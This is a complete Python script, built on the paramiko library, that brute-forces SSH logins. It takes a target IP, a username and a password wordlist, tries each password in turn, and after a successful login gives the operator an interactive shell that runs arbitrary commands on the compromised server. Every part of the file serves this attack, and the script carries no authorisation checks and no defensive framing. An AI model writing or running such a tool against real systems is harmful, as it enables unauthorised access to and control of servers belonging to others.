#!/usr/bin/env python3

import paramiko
import getpass

def connect_to_ssh(host, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, username=username, password=password)
        print("Connected to the remote server.")
        return ssh

    except paramiko.AuthenticationException:
        print("Authentication failed for password:", password)
        return None

    except paramiko.SSHException as ssh_ex:
        print(f"Error while connecting: {ssh_ex}")
        return None

    except Exception as ex:
        print(f"An error occurred: {ex}")
        return None

def main():
    host = input("Please provide the IP of the SSH server: ")
    username = input("Please provide the SSH username: ")

    wordlist_path = input("Please provide the path to the wordlist file: ")
    with open(wordlist_path, 'r') as f:
        wordlist = f.read().splitlines()

    ssh = None
    for password in wordlist:
        ssh = connect_to_ssh(host, username, password)
        if ssh:
            break

    if not ssh:
        print("Could not connect using any password from the wordlist.")
        return

    try:
        # Execute commands on the remote server
        while True:
            command = input("Enter a command to execute on the remote server (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break

            stdin, stdout, stderr = ssh.exec_command(command)
            print(stdout.read().decode())
            print(stderr.read().decode())

    except Exception as ex:
        print(f"An error occurred: {ex}")

    finally:
        ssh.close()
        print("SSH connection closed.")

if __name__ == "__main__":
    main()
